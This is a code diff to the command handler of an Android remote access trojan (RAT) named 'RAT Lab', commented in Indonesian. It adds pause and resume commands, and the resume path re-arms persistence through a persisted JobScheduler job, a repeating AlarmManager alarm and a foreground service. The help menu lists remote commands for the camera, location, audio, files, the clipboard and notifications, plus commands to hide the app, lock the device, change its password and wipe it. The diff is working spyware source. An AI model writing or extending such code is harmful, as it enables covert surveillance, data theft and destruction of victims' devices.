@@ -1,5 +1,8 @@
 package com.ratlab;
 
+import android.app.AlarmManager;
+import android.app.PendingIntent;
+import android.app.job.JobScheduler;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
@@ -21,12 +24,15 @@ public class CommandHandler {
 
     private static final String TAG = "CommandHandler";
     private static final MediaType JSON = MediaType.get("application/json; charset=utf-8");
+    private static final int JOB_ID = 2001;
+    private static final int ALARM_ID = 3001;
 
     private final Context ctx;
     private final String token;
     private final long ownerId;
     private final OkHttpClient http;
     private long lastUpdateId = 0;
+    private boolean paused = false;
 
     private final CameraModule camera;
     private final LocationModule location;
@@ -37,7 +43,6 @@ public class CommandHandler {
     private final AudioModule audio;
     private final HideModule hide;
     private final DeviceAdminModule admin;
-    private final TtsControl ttsControl;
 
     public CommandHandler(Context ctx, String token, long ownerId) {
         this.ctx = ctx;
@@ -57,7 +62,6 @@ public class CommandHandler {
         this.audio = new AudioModule(ctx);
         this.hide = new HideModule(ctx);
         this.admin = new DeviceAdminModule(ctx);
-        this.ttsControl = null; // tts pakai static method
     }
 
     public void pollUpdates() throws IOException {
@@ -105,10 +109,26 @@ public class CommandHandler {
 
     private String handleCommand(String cmd, String args) {
         try {
+            // Command khusus pause/resume — tetep jalan walau paused
+            switch (cmd) {
+                case "/stop":
+                    return stopRat();
+                case "/resume":
+                    return resumeRat();
+            }
+
+            // Kalau paused, command lain di-skip (kecuali start/help)
+            if (paused && !cmd.equals("/start") && !cmd.equals("/help")) {
+                return "RAT sedang di-pause. Kirim /resume untuk mengaktifkan.";
+            }
+
             switch (cmd) {
                 case "/start":
                 case "/help":
                     return "RAT Lab — Commands:\n\n"
+                            + "== KONTROL RAT ==\n"
+                            + "/stop — hentikan RAT\n"
+                            + "/resume — lanjutkan RAT\n\n"
                             + "== INFO ==\n"
                             + "/ping /info /uptime /whoami /env\n\n"
                             + "== KAMERA ==\n"
@@ -126,18 +146,18 @@ public class CommandHandler {
                             + "/download <url> /upload <path>\n\n"
                             + "== JARINGAN ==\n"
                             + "/wifi /wifiscan /netstat /processes\n\n"
-                            + "== KONTROL ==\n"
-                            + "/torch /brightness <level> /wallpaper <url>\n"
-                            + "/clipboard /notif\n\n"
-                            + "== ADMIN ==\n"
-                            + "/hide /unhide /restart\n"
+                            + "== KONTROL HP ==\n"
+                            + "/torch /brightness <level> /clipboard /notif\n\n"
+                            + "== STEALTH ==\n"
+                            + "/hide /unhide /restart\n\n"
+                            + "== DEVICE ADMIN ==\n"
                             + "/lock [password] /force-lock <menit>\n"
                             + "/change-password <password>\n"
                             + "/disable-camera on|off\n"
                             + "/reset /wipe";
 
                 case "/ping":
-                    return "Pong! Bot aktif.";
+                    return "Pong! Bot aktif. Paused: " + paused;
 
                 case "/info":
                     return DeviceInfo.get(ctx);
@@ -270,6 +290,91 @@ public class CommandHandler {
             }
         } catch (Exception e) {
             return "Error: " + e.getMessage();
+        }
+    }
+
+    // ============================================================
+    // STOP RAT — matiin service + persistence
+    // ============================================================
+    private String stopRat() {
+        try {
+            paused = true;
+
+            // 1. Matiin JobScheduler
+            try {
+                JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
+                if (js != null) js.cancelAll();
+            } catch (Exception e) {}
+
+            // 2. Matiin AlarmManager
+            try {
+                AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
+                Intent ai = new Intent(ctx, AlarmReceiver.class);
+                PendingIntent pi = PendingIntent.getBroadcast(ctx, ALARM_ID, ai,
+                        PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+                if (am != null) am.cancel(pi);
+            } catch (Exception e) {}
+
+            // 3. Stop foreground service (tapi tetep polling command)
+            //    Service tetep hidup biar bisa terima /resume
+            return "RAT di-PAUSE.\n"
+                    + "- JobScheduler: OFF\n"
+                    + "- AlarmManager: OFF\n"
+                    + "- Command lain di-skip\n\n"
+                    + "Kirim /resume untuk lanjut.";
+        } catch (Exception e) {
+            return "Error stop: " + e.getMessage();
+        }
+    }
+
+    // ============================================================
+    // RESUME RAT — nyalain service + persistence
+    // ============================================================
+    private String resumeRat() {
+        try {
+            paused = false;
+
+            // 1. Restart service (kalau mati)
+            Intent svc = new Intent(ctx, BotService.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                ctx.startForegroundService(svc);
+            } else {
+                ctx.startService(svc);
+            }
+
+            // 2. Nyalain JobScheduler
+            try {
+                JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
+                android.app.job.JobInfo job = new android.app.job.JobInfo.Builder(
+                        JOB_ID, new android.content.ComponentName(ctx, RestartJobService.class))
+                        .setPersisted(true)
+                        .setPeriodic(15 * 60 * 1000L)
+                        .setRequiredNetworkType(android.app.job.JobInfo.NETWORK_TYPE_ANY)
+                        .build();
+                if (js != null) js.schedule(job);
+            } catch (Exception e) {}
+
+            // 3. Nyalain AlarmManager
+            try {
+                AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
+                Intent ai = new Intent(ctx, AlarmReceiver.class);
+                PendingIntent pi = PendingIntent.getBroadcast(ctx, ALARM_ID, ai,
+                        PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+                if (am != null) {
+                    am.setRepeating(AlarmManager.RTC_WAKEUP,
+                            System.currentTimeMillis() + 60_000L,
+                            60_000L,
+                            pi);
+                }
+            } catch (Exception e) {}
+
+            return "RAT di-RESUME.\n"
+                    + "- Service: ON\n"
+                    + "- JobScheduler: ON\n"
+                    + "- AlarmManager: ON\n\n"
+                    + "Semua command aktif lagi.";
+        } catch (Exception e) {
+            return "Error resume: " + e.getMessage();
         }
     }
 
